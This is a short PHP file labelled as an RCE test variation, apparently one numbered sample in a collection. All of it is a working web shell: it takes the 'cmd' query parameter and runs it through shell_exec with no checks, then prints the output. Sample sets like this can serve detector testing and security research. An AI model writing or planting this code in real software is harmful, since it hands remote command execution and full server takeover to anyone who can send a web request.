<?php
// RCE test variation #140
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>